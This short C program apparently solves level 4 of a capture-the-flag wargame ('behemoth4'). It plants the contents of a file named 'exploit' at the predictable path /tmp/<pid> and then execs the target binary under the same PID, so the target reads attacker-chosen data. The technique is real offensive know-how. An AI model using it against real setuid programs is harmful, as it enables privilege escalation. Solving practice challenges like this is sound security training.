#include <stdio.h>
#include <unistd.h>

int main(int argc, char *const argv[], char *const envp[]) {
  printf("pid 1: %d\n", getpid());
  char path[100];                 
  sprintf(path, "/tmp/%d", getpid());
  FILE *file = fopen(path, "w");  
  FILE *exploit = fopen("exploit", "r");
  char c = fgetc(exploit);                         
  while(c!=EOF) {
    fputc(c, file);
    c = fgetc(exploit);
  }    
  fclose(file);
  fclose(exploit);
  execve("/behemoth/behemoth4", argv, envp);
  return 0;                       
}
